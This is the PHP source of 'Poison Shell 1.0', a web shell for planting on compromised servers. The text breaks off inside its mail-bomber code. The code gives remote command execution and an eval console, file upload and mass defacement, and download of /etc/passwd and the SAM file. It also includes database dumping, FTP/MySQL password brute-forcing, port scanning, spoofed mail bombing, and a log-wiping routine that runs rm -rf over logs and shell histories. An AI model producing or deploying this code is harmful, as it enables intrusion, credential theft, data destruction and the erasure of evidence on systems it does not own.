<?php

error_reporting(0);

/*

Poison Shell 1.0

(C) Doddy Hackman 2012

Mail : lepuke[at]hotmail[com]
Web : doddyhackman.webcindario.com
Blog : doddy-hackman.blogspot.com

*/

@session_start();
$username = "098f6bcd4621d373cade4e832627b4f6"; //test
$password = "098f6bcd4621d373cade4e832627b4f6"; //test
if (isset($_POST['user'])) {
    if (md5($_POST['user']) == $username && md5($_POST['pass']) == $password) {
        $_SESSION['loginh'] = "1";
    }
}
if (isset($_GET['chaunow'])) {
    @session_destroy();
}
if ($_SESSION['loginh'] == 1) {
    if (isset($_GET['info'])) {
        die(phpinfo());
    }
    if (isset($_POST['sessionew'])) {
        @session_start();
        if ($_SESSION[$_POST['sessionew']] = $_POST['valor']) {
            echo "<script>alert('Session created');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
    }
    function creditos() {
        echo "<br><br></fieldset><br><br>"; // ventana termina
        echo "<fieldset><center>-- == (C) Doddy Hackman 2012 || Contact : lepuke[at]hotmail[com] || Web : doddyhackman.webcindario.com == --</center></fieldset>";
        exit(1);
    }
    if (isset($_GET['bajardb'])) {
        $tod = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);
        mysql_select_db($_GET['bajardb']);
        $resultado = mysql_query("SHOW TABLES FROM " . $_GET['bajardb']);
        while ($tabla = mysql_fetch_row($resultado)) {
            foreach($tabla as $indice => $valor) {
                $todo.= "<br><br>" . $valor . "<br><br>";
                $resultadox = mysql_query("SELECT * FROM " . $valor);
                $todo.= "<table border=1>";
                for ($i = 0;$i < mysql_num_fields($resultadox);$i++) {
                    $todo.= "<th>" . mysql_field_name($resultadox, $i) . "</th>";
                }
                while ($dat = mysql_fetch_row($resultadox)) {
                    $todo.= "<tr>";
                    foreach($dat as $val) {
                        $todo.= "<td >" . $val . "</td>";
                    }
                }
                $todo.= "</tr></table>";
            }
        }
        @mysql_free_result($tod);
        @header("Content-type: application/vnd-ms-excel; charset=iso-8859-1");
        @header("Content-Disposition: attachment; filename=" . date('d-m-Y') . ".xls");
        echo $todo;
        exit(1);
    }
    if (isset($_GET['bajartabla'])) {
        $tod = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die("<h1>Error</h1>");
        mysql_select_db($_GET['condb']);
        if (!empty($_GET['sentencia'])) {
            $resultado = mysql_query($_GET['sentencia']);
        } else {
            $resultado = mysql_query("SELECT * FROM " . $_GET['bajartabla']);
        }
        $todo.= "<table border=1>";
        for ($i = 0;$i < mysql_num_fields($resultado);$i++) {
            $todo.= "<th>" . mysql_field_name($resultado, $i) . "</th>";
        }
        while ($dat = mysql_fetch_row($resultado)) {
            $todo.= "<tr>";
            foreach($dat as $val) {
                $todo.= "<td>" . $val . "</td>";
            }
        }
        @mysql_free_result($tod);
        $todo.= "</tr></table>";
        @header("Content-type: application/vnd-ms-excel; charset=iso-8859-1");
        @header("Content-Disposition: attachment; filename=" . date('d-m-Y') . ".xls");
        echo $todo;
        exit(1);
    }
    if (isset($_GET['reload'])) {
        $tipo = pathinfo($_GET['reload']);
        echo '<meta http-equiv="refresh" content="0;URL=?dir=' . $tipo['dirname'] . '">';
        creditos();
    }
    function dame($file) {
        return substr(sprintf('%o', fileperms($file)), -4);
    }
    if (isset($_GET['down'])) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=" . basename($_GET['down']));
        readfile($_GET['down']);
        exit(0);
    }
    if (isset($_POST['cookienew'])) {
        if (setcookie($_POST['cookienew'], $_POST['valor'])) {
            echo "<script>alert('Cookie cREATED');</script>";
            echo '<meta http-equiv="refresh" content="0;URL=?cookiemanager">';
        } else {
            echo "<script>alert('Error');</script>";
        }
    }
    echo '<style type="text/css">


.main {
margin            : -287px 0px 0px -490px;
border            : White solid 1px;
BORDER-COLOR: #00FF00;
}


#pie {
position: absolute;
bottom: 0;
}

body,a:link {
background-color: #000000;
color:#00FF00;
Courier New;
cursor:crosshair;
font-size: small;
}

input,table.outset,table.bord,table,textarea,select,fieldset,td,tr {
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;color:#00FF00; 
border: solid 1px #00FF00;
border-color:#00FF00
}

a:link,a:visited,a:active {
color: #00FF00;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>';
    echo "<title>" . $_SERVER["SERVER_NAME"] . " - PoisonShell</title>";
    $verdad = php_uname('s') . php_uname('r');
    $link = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=" . $verdad . "&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
    echo "<center><table><tr><td class=main><br><h2>&nbsp;&nbsp;&nbsp;PoisonShell&nbsp;&nbsp;&nbsp;</h2><br></td><td class=main>
<b>System</b> : <a href='" . $link . "'>" . $verdad . "</a> " . " " . php_uname('v') . "<br><b>Server</b> : " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
    if (file_exists("C:/WINDOWS/repair/sam")) {
        echo "<b>File Found : </b><a href=?down=C:/WINDOWS/repair/sam>SAM</a>&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    if (file_exists("/etc/passwd")) {
        echo "<b>File Found : </b><a href=?down=/etc/passwd>/etc/passwd</a>&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "<b>IP</b> : " . $_SERVER['SERVER_ADDR'] . "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<b>User</b> : uid=" . getmyuid() . " (" . get_current_user() . ") gid=" . getmygid() . "&nbsp;&nbsp;&nbsp;
<b>Path</b> : " . getcwd() . "&nbsp;&nbsp;&nbsp;
<b>Version PHP</b> : " . phpversion() . "<br>";
    if (ini_get('safe_mode') == 0) {
        echo "<b>Safe Mode</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<b>Safe Mode</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    if (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on") {
        echo "<b>Magic Quotes</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<b>Magic Quotes</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("perl -h", $perl);
    if ($perl) {
        echo "<b>Perl</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<b>Perl</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("wget --help", $wget);
    if ($wget) {
        echo "<b>WGET</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<b>WGET</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    exec("curl_version", $curl);
    if ($curl) {
        echo "<b>CURL</b> : ON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    } else {
        echo "<b>CURL</b> : OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "</tr></td></table></center><br>";
    echo "

<center>
<table>
<td class=main><a href=?dir=>Navigate</a></td><td class=main><a href=?cmd=>CMD</a></td>
<td class=main><a href=?upload=>Upload</a></td><td class=main><a href=?base64=>Base64</a></td>
<td class=main><a href=?phpconsole=>Eval</a></td><td class=main><a href=?info=>phpinfo</a></td>
<td class=main><a href=?bomber=>Mailer</a></td><td class=main><a href=?cracker=>Crackers</a></td>
<td class=main><a href=?proxy=>ProxyWeb</a></td>
<td class=main><a href=?port=>PortScan</a></td><td class=main><a href=?md5=>Encodes</a></td>
<td class=main><a href=?md5crack=>MD5Cracker</a></td>
<td class=main><a href=?backshell>BackShell</a></td><td class=main><a href=?mass=>MassDefacement</a></td>
<td class=main><a href=?logs=>CleanLogs</a></td><td class=main><a href=?ftp=>FTP</a></td>
<td class=main><a href=?sql=>SQL</a></td><td class=main><a href=?cookiemanager=>Cookies</a></td>
<td class=main><a href=?sessionmanager=>Session</a></td>
<td class=main><a href=?chau=>DestroyMe</a></td>
</table>
</center>
<br><br>
";
    echo "<fieldset><br>"; //ventana inicia
    //and count($_POST) == 0
    if (count($_GET) == 0) {
        echo <<<_HTML_
<center><pre>
                                           
                                           
                 ¾¾¾¾¾¾¾¾¾¾¾               
             ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾           
           ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾          
         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾        
        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
       ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
       ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
       ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
        ¾¾¾¾¾¾¾  ¾¾¾¾¾¾¾¾¾¾¾    ¾¾¾¾       
         ¾¾¾¾       ¾¾¾¾¾¾      ¾¾¾¾       
          ¾¾¾      ¾¾¾ ¾¾¾      ¾¾¾        
          ¾¾¾¾¾¾¾¾¾¾¾   ¾¾¾   ¾¾¾¾         
           ¾¾¾¾¾¾¾¾¾     ¾¾¾¾¾¾¾¾¾         
           ¾¾¾¾¾¾¾¾¾  ¾  ¾¾¾¾¾¾¾¾¾         
           ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
                ¾¾¾¾¾¾¾¾¾¾¾¾¾              
              ¾  ¾¾¾¾¾¾¾¾¾¾  ¾             
              ¾    ¾ ¾¾¾¾ ¾  ¾             
              ¾ ¾¾          ¾¾             
     ¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾             
    ¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾     
    ¾¾¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾¾¾¾   
    ¾¾¾¾¾¾¾¾¾¾      ¾¾¾         ¾¾¾¾¾¾¾¾¾  
     ¾¾¾  ¾¾¾¾¾¾             ¾¾¾¾¾¾¾¾¾¾¾   
              ¾¾¾¾¾¾     ¾¾¾¾¾¾¾           
                 ¾¾¾¾¾¾¾¾¾¾¾¾              
                  ¾¾¾¾¾¾¾¾¾                
               ¾¾¾¾¾¾¾ ¾¾¾¾¾¾¾             
           ¾¾¾¾¾¾¾         ¾¾¾¾¾¾¾         
       ¾¾¾¾¾¾¾                ¾¾¾¾¾¾¾¾¾¾   
  ¾¾¾¾¾¾¾¾                       ¾¾¾¾¾¾¾¾  
  ¾¾¾¾¾¾                           ¾¾¾¾¾¾  
   ¾¾¾¾                             ¾¾¾¾   
                                           
                                           
                                           
</pre></center>                                                             
_HTML_;
        
    }
    if (isset($_GET['cracker'])) {
        echo "
<h2><center>Multi Cracker</center></h2><br>
<form action='' method=POST>
<center><table border=1>
<td><b>Host : </b></td><td><input type=text name=host value=localhost></td><tr>
<td><b>User : </b></td><td><input type=text name=user value=doddy></td><tr>
<td><b>Wordlist : </b></td><td><input type=text name=passnow value='c:/aca.txt'></td><tr>
<td><b>Service : </b></td><td><select name=services><option>FTP</option><option>MYSQL</option></select></td><tr>
</table><br><br><input type=submit value=Crack><br><br></center>
</form>

";
        if (isset($_POST['passnow'])) {
            $open = fopen($_POST['passnow'], "r");
            echo "<br><br><fieldset><center>";
            echo "<br>[+] Starting the crack<br><br>";
            if ($_POST['services'] == "FTP") {
                echo "[+] Service : FTP<br><br>";
                while (!feof($open)) {
                    $word = fgets($open, 255);
                    $linea = chop($word);
                    if ($enter = ftp_connect($_POST['host'])) {
                        if ($dentro = ftp_login($enter, $_POST['user'], $linea)) {
                            echo "[+] User : " . $_POST['user'] . "<br>";
                            echo "[+] Pass : " . $linea . "<br>";
                            fclose($open);
                            ftp_close($enter);
                            echo "<br><br>[+] Scan Finished<br><br>";
                            creditos();
                        }
                    }
                }
                echo "<br><br>[+] Scan Finished<br><br>";
            }
            if ($_POST['services'] == "MYSQL") {
                echo "[+] Service : MYSQL<br><br>";
                while (!feof($open)) {
                    $word = fgets($open, 255);
                    $linea = chop($word);
                    if (mysql_connect($_POST['host'], $_POST['user'], $linea)) {
                        echo "[+] User : " . $_POST['user'] . "<br>";
                        echo "[+] Pass : " . $linea . "<br>";
                        fclose($open);
                        mysql_close();
                        echo "<br><br>[+] Scan Finished<br><br>";
                        creditos();
                    }
                }
                echo "<br><br>[+] Scan Finished<br><br>";
            }
        }
    }
    if (!empty($_GET['hostar'])) {
        @set_time_limit(5);
        echo "<center><h2>PortScan</h2></center><br><br>";
        echo "<fieldset>";
        echo "[+] <b>Target : </b>" . $_GET['hostar'] . "<br>";
        echo "[+] <b>Scan to : </b>" . $_GET['start'] . "-" . $_GET['end'] . "<br><br>";
        for ($i = $_GET['start'];$i < $_GET['end'];$i++) {
            $re = @fsockopen($_GET['hostar'], $i, $errno, $errstr, 1);
            if ($re) {
                echo "<b>[+] Port Found : </b>" . $i . "<br>";
            }
        }
        echo "<br><br><b>[+] Scan Finished</b><br><br>";
        echo "</fieldset>";
    }
    if (isset($_GET['port'])) {
        echo "<center><h2>ScanPort</h2></center><br><br>";
        echo "<center>
<form action='' method=GET>
<table border=1>
<td><b>Host : </b></td><td><input type=text name=hostar value=localhost></td><tr>
<td><b>Port Start : </b></td><td><input type=text name=start value=79></td><tr>
<td><b>Port End : </b></td></b><td><input type=text name=end value=82></td><tr>
</table><br>
<input type=submit value=Scan>
</form></center>
<br>";
    }
    if (isset($_GET['proxy'])) {
        echo "<center><h2>Simple ProxyWeb</h2></center><br><br>";
        echo "<center><form action='' method=GET>";
        echo "<b>Web : </b><input type=text size=40 name=proxy value=http://localhost/sql.php><input type=submit value=Get>";
        echo "</form></center>";
        $code = @file_get_contents($_GET['proxy']);
        if ($code) {
            echo "<br><br><fieldset>" . $code . "<br><br></fieldset>";
        }
    }
    if (isset($_GET['md5'])) {
        echo "<form action='' method=POST>
<b>Text :</b> <input type=text name=tex value=test><select name=optionsa><option>MD5</option><option>SHA1</option><option>CRC32</option></select><input type=submit value=Encode>
</form>
";
    }
    if (isset($_POST['tex'])) {
        echo "<br><br>Result<br><br><fieldset>";
        if ($_POST['optionsa'] == "MD5") {
            echo md5($_POST['tex']);
        }
        if ($_POST['optionsa'] == "SHA1") {
            echo sha1($_POST['tex']);
        }
        if ($_POST['optionsa'] == "CRC32") {
            printf("%u\n", crc32($_POST['tex']));
        }
        echo "</fieldset>";
    }
    if (isset($_GET['perms'])) {
        echo "
<form action='' method=POST>
<b>File :</b> <input type=text name=archivo value=" . $_GET['perms'] . ">
<br>
Perms : <input type=text name=perms value=" . dame($_GET['perms']) . "
<br><br>
<br><input type=submit name=cambiarperms value=Change>
</form>
";
    }
    if (isset($_POST['cambiarperms'])) {
        if (chmod($_POST['archivo'], $_POST['perms'])) {
            echo "<script>alert('cHANGED');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['archivo']) . ">Atras</a><br><br></font>
";
    }
    if (isset($_GET['ren'])) {
        echo "
<form action='' method=POST>
File : <input type=text name=nombre value=" . $_GET['ren'] . "><br>
Change to : <input type=text name=cambio><br><BR>
<input type=submit name=cambios value=Change><BR>
</form>
";
    }
    if (isset($_POST['cambios'])) {
        if (@rename($_POST['nombre'], $_POST['cambio'])) {
            echo "<script>alert('Changed');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['cambios']) . ">Atras</a><br><br></font></center>";
    }
    if (isset($_POST['crear1'])) {
        chdir($_POST['dir']);
        if (fopen($_POST['crear1'], "w")) {
            echo "<script>alert('File cREATED');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
    }
    if (isset($_POST['crear2'])) {
        chdir($_POST['dir']);
        if (@mkdir($_POST['crear2'], 777)) {
            echo "<script>alert('Directory created');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
    }
    if (isset($_GET['copiar'])) {
        echo '
<form action="" method=POST>
File : <input type=text name=archivo value=' . $_GET['copiar'] . '><br>
Copy to : <input type=text name=nuevo><br><br>
<input type=submit name=copiado value=Copy><BR>
</form>
';
    }
    if (isset($_POST['copiado'])) {
        if (copy($_POST['archivo'], $_POST['nuevo'])) {
            echo "<script>alert('OK');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['archivo']) . ">Atras</a><br><br></font></center>";
    }
    if (isset($_GET['open'])) {
        echo "<form action='' method=POST>";
        echo "<center>";
        echo "<textarea cols=80 rows=40 name=code>";
        $archivo = file($_GET['open']);
        foreach($archivo as $n => $sub) {
            $texto = htmlspecialchars($sub);
            echo $texto;
        }
        echo "</textarea></center>";
        echo "<br><br><center><input type=submit value=Save name=modificar></center><br><br>";
        echo "</form>";
    }
    if (isset($_POST['modificar'])) {
        $modi = fopen($_GET['open'], 'w+');
        if ($yeah = fwrite($modi, $_POST['code'])) {
            echo "<script>alert('OK');</script>";
        } else {
            echo "<script>alert('Error');</script>";
        }
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_GET['open']) . ">Atras</a><br><br></font></center>";
    }
    if (isset($_POST['options'])) {
        $files = $_POST['valor'];
        if ($_POST['options'] == "Delete") {
            foreach($files as $file) {
                if (filetype($file) == "dir") {
                    @rmdir($file);
                } else {
                    @unlink($file);
                }
            }
            echo '<meta http-equiv=Refresh content="0;url=?dir=' . urlencode($dir->path) . '">';
            echo "<script>alert('Files Deleted');</script>";
        }
        if ($_POST['options'] == "Download") {
            foreach($files as $file) {
                echo '<meta http-equiv=Refresh content="0;url=?down=' . $file . '">';
                exit(0);
            }
        }
        if ($_POST['options'] == "Copy") {
            echo "<form action='' method=POST>";
            foreach($files as $file) {
                echo 'Name : <input type=text name=rutax[] value="' . $file . '"> To : <input type=text name=cambiax[] value="' . $file . '"><br>';
            }
            echo "<br><br><input type=submit value=Copy>";
            echo "</form>";
            exit(0);
        }
        if ($_POST['options'] == "Move") {
            echo "<form action='' method=POST>";
            foreach($files as $file) {
                echo 'Name : <input type=text name=rutas[] value="' . $file . '"> To : <input type=text name=cambiar[] value="' . $file . '"><br>';
            }
            echo "<br><br><input type=submit name=mirameboludo value=Move>";
            echo "</form>";
            creditos();
        }
    }
    if (isset($_POST['rutax'])) {
        $tengo = count($_POST['rutax']);
        for ($i = 0;$i <= $tengo;$i++) {
            @copy($_POST['rutax'][$i], $_POST['cambiax'][$i]);
        }
        echo "<script>alert('Files copied');</script>";
    }
    if (isset($_POST['mirameboludo'])) {
        $tengo = count($_POST['rutas']);
        for ($i = 0;$i <= $tengo;$i++) {
            @rename($_POST['rutas'][$i], $_POST['cambiar'][$i]);
        }
        echo "<script>alert('Files moved');</script>";
    }
    if (isset($_GET['dir'])) {
        if ($_GET['dir'] == "") {
            $path = getcwd();
            @chdir($path);
            $dir = @dir($path);
        } else {
            $path = $_GET['dir'];
            @chdir($path);
            $dir = @dir($path);
        }
        $scans = range("B", "Z");
        echo "<b>Detect Drives : </b>";
        foreach($scans as $drive) {
            $drive = $drive . ":\\";
            if (is_dir($drive)) {
                echo "&nbsp;&nbsp;" . "<a href=?dir=" . $drive . ">" . $drive . "</a>";
            }
        }
        echo "
<br><br>
<form action='' method=GET>
<b>Directory</b> : <input type=text name=dir value='" . $path . "'><input type=submit name=ir value=Enter>
</form>
<br><br>
<form action='' method=POST>
<b>New File</b> : <input type=text name=crear1><input type=hidden name=dir value=" . $dir->path . "><input type=submit value=Make>
</form>
<form action='' method=POST>
<b>New Directory</b> : <input type=text name=crear2><input type=hidden name=dir value=" . $dir->path . "><input type=submit value=Make>
</form><br><br>
";
        $archivos = array('dir' => array(), 'file' => array());
        while ($archivo = $dir->read()) {
            $ver = @filetype($path . '/' . $archivo);
            if ($ver == "dir") {
                $archivos['dir'][] = $path . '/' . $archivo;
            } else {
                $archivos['file'][] = $path . '/' . $archivo;
            }
        }
        $dir->rewind();
        if (count($archivos['dir']) == 0 and count($archivos['file'] == 0)) {
            echo "<script>alert('Directory empty');/<script>";
        }
        echo "<form action='' method=POST>";
        echo "<br><b>Directory Found</b> : " . count($archivos['dir']) . "<br>";
        echo "<b>Files Found</b> : " . count($archivos['file']) . "<br><br><br>";
        echo "<table bgcolor=#00FF00 border=1>";
        echo "<td width=100>Name</td><td width=100>Type</td><td width=100>Modification time</td>";
        echo "<td width=100>Perms</td><td width=100>Action</td>";
        echo "<tr>";
        foreach($archivos['dir'] as $dirs) {
            $dirsx = pathinfo($dirs);
            echo "<td width=100><a href=?dir=" . urlencode($dirs) . ">" . urlencode($dirsx['basename']) . "</a></td>";
            echo "<td width=100>Directory</td>";
            echo "<td width=100>" . date("F d Y H:i:s", fileatime($dirs)) . "</td>";
            echo "<td width=100><a href=?perms=" . $dirs . ">" . dame($dirs) . "</a></td>";
            echo "<td><input type=checkbox name=valor[] value=" . $dirs . "></td>";
            echo "</tr><tr>";
        }
        foreach($archivos['file'] as $files) {
            $filex = pathinfo($files);
            echo "<td width=100><a href=?open=" . urlencode($files) . ">" . urlencode($filex['basename']) . "</a></td>";
            echo "<td width=100>File</td>";
            echo "<td width=100>" . date("F d Y H:i:s", fileatime($files)) . "</td>";
            echo "<td width=100><a href=?perms=" . $files . ">" . dame($files) . "</a></td>";
            echo "<td><input type=checkbox name=valor[] value=" . $files . "></td>";
            echo "</tr><tr>";
        }
        echo "</table>";
        echo "<br><br>
Options : 
<select name=options>
<option>Delete</option>
<option>Move</option>  
<option>Copy</option>
<option>Download</option>
</select>&nbsp;&nbsp;<input type=submit value=Ok></form>";
    }
    if (isset($_GET['cmd'])) {
        echo '<center><h2>Console</h2><br>
<form action="" method=POST>
<b>Command : </b><input type=text name=comando size=50><input type=submit name=ejecutar value=Now>
</form></center>
';
    }
    if (isset($_POST['ejecutar'])) {
        echo '<center><br>
<br><br>Command<br><br>
<fieldset>
' . $_POST['comando'] . '</fieldset>
<br><br>Result<br><br><fieldset>';
        if (!system($_POST['comando'])) {
            echo "<script>alert('Error loading command');</script>";
            echo "Error";
        }
        echo "</center><br><br></fieldset><br><br>";
    }
    if (isset($_GET['upload'])) {
        echo "<center><h2>Upload files</h2></center><center><br><br><br>";
        echo '
<form enctype="multipart/form-data" action="" method=POST>
<b>File : </b><input type=file name=archivo><br><br>    
<b>Directory : </b><input type=text name=destino value=' . getcwd() . '>
<input type=submit value=Upload><br>
</form>';
        if (isset($_FILES['archivo'])) {
            $subimos = basename($_FILES['archivo']['name']);
            if (move_uploaded_file($_FILES['archivo']['tmp_name'], $subimos)) {
                if (copy($subimos, $_POST['destino'] . "/" . $subimos)) {
                    unlink($subimos);
                    echo "<script>alert('File uploaded');</script>";
                }
            } else {
                echo "<script>alert('Error');</script>";
            }
        }
    }
    if (isset($_GET['base64'])) {
        echo '<center><h2>Base64 encode/decoder</h2><br>
<form action="" method=POST>
<b>Encode :</b> <input type=text name=code size=50><input type=submit name=codificar value=Encode>
</form>
<form action="" method=POST>
<b>Decode :</b> <input type=text name=decode size=50><input type=submit name=decodificar value=Decode>
</form></center>
';
    }
    if (isset($_POST['codificar'])) {
        echo "<center>";
        echo "<br><br>Text<br><br><fieldset>" . $_POST['code'] . "</fieldset><br><br>Result<br><br><fieldset>";
        echo base64_encode($_POST['code']);
        echo "</fieldset></center><br><br>";
    }
    if (isset($_POST['decodificar'])) {
        echo "<center><br><br>Text<br><br><fieldset>" . $_POST['decode'] . "</fieldset><br><br>Result<br><br><fieldset>";
        echo base64_decode($_POST['decode']);
        echo "</fieldset></center><br><br>";
    }
    if (isset($_GET['phpconsole'])) {
        echo '<center><h2>Function eval()</h2><center><br>
<form action="" method=POST>
<b>Code :</b> <input type=text name=codigo size="70"><input type=submit name=cargar value=OK>
</form>
';
    }
    if (isset($_POST['cargar'])) {
        echo "<br><br>Code<br><br>
<fieldset>
" . $_POST['codigo'] . "
</fieldset>
<br><br>
Result<br><br>
<fieldset>";
        eval($_POST['codigo']);
        echo "</fieldset>
";
    }
    if (isset($_GET['logs'])) {
        echo '
<br><br><center><h3>Zapper</h3>
<br><br>
<form action="" method=GET>
<input type=submit name=clean value=Start>
</form></center>
<br><br>
';
    }
    if (isset($_GET['clean'])) {
        $paths = array("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp", "/var/log/secure", "/root/.ksh_history", "/root/.bash_history", "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp", "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm", "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs", "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog", "/var/log/messages/", "/var/log/proftpd/xferlog.legacy", "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", "/var/log/httpsd/ssl.access_log", "/etc/mail/access", "/var/log/qmail", "/var/log/smtpd", "/var/log/samba", "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority", "/var/log/poplog", "/var/log/news.all", "/var/log/spooler", "/var/log/news", "/var/log/news/news", "/var/log/news/news.all", "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", "/var/log/news/suck.err", "/var/log/news/suck.notice", "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks", "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log", "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs", "/var/log/auth");
        echo "<br><br><center><h2>OutPut</h2></center>";
        $comandos = array('find / -name *.bash_history -exec rm -rf {} \;', 'find / -name *.bash_logout -exec rm -rf {} \;', 'find / -name log* -exec rm -rf {} \;', 'find / -name  *.log -exec rm -rf {} \;', 'unset HISTFILE', 'unset SAVEHIST');
        echo "<center>";
        foreach($paths as $path) {
            if (@unlink($path)) {
                echo $path . ": <b>Deleted</b><br>";
            }
        }
        echo "<br><br>";
        foreach($comandos as $comando) {
            echo "<b>Loading command : </b>" . $comando . "<br>";
            system($comando);
        }
        echo "<center>";
    }
    if (isset($_GET['mass'])) {
        echo "<center><h2>MassDefacement</h2></center><br><br><center>
<form action='' method=POST>
<b>Directory to start :</b> <input type=text name=dir value=" . getcwd() . "><br><br>
<b>Code :</b> <input type=text name=codigo size=70>
<input type=submit name=def value=Start>
</form>
</center>
";
    }
    function juntar($dira, $text) {
        $dir = opendir($dira);
        while (!is_bool($archivos = readdir($dir))) {
            if ($archivos != "..") {
                if ($archivos != ".") {
                    if ($archivos != basename($_SERVER['PHP_SELF'])) {
                        if (@filetype($dira . "/" . $archivos) == dir) {
                            juntar($dira . "/" . $archivos, $text);
                        } else {
                            echo "<center>";
                            echo "<b>Deface : </b>" . $dira . "/" . $archivos . "<br>";
                            $solo = fopen($dira . "\\" . $archivos, "w");
                            $solo = fwrite($solo, $text);
                            fclose($solo);
                            echo "</center>";
                        }
                    }
                }
            }
        }
    }
    if (isset($_POST['def'])) {
        echo "<br><br><center><h2>OutPut</h2></center><br><br>";
        juntar($_POST['dir'], $_POST['codigo']);
    }
    if (isset($_GET['chau'])) {
        if ($_GET['chau'] == "fuckit") {
            echo "<br><br><h3>Kapoom !!!</h3><br><br>";
            unlink(basename($_SERVER['PHP_SELF'])); //descomentar para usar esta funcion
            
        } else {
            echo "<br><br><font color=red><h3><center>Acceso Denegado</center></h3></font><br><br>";
        }
    }
    if (isset($_GET['bomber'])) {
        echo "<center><h2>Mail Bomber</h2></center><br><br>
<form action='' method=POST>
<center><table border=1>
<td>Target : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=target@hotmail.com size=44><tr>
<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=lagarto@juancho.com size=44><tr>
<td>FakeName : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=nombrefalso value=Juancho size=44><tr>
<td>ListMails : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=listamails value=None size=44><tr>
<td>Subjects : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=asunto value=Hola size=44><tr>
<td>Count : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=count value=1 size=44><tr>
<td>Body : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><textarea name=mensaje rows=7 cols=40>Chau</textarea></td><tr>
</table><br><br>
<input type=submit name=bombers value=Send></center>
</form>
";
    }
    if (isset($_POST['bombers'])) {
        $need.= "MIME-Version: 1.0\n";
        $need.= "Content-type: text/html ; charset=iso-8859-1\n";
        $need.= "MIME-Version: 1.0\n";
        $need.= "From: " . $_POST['nombrefalso'] . " <" . $_POST['falso'] . ">\n";
        $need.= "To: " . $_POST['nombrefalso'] . "<" . $_POST['falso'] . ">\n";
        $need.= "Reply-To:" . $_POST['falso'] . "\n";
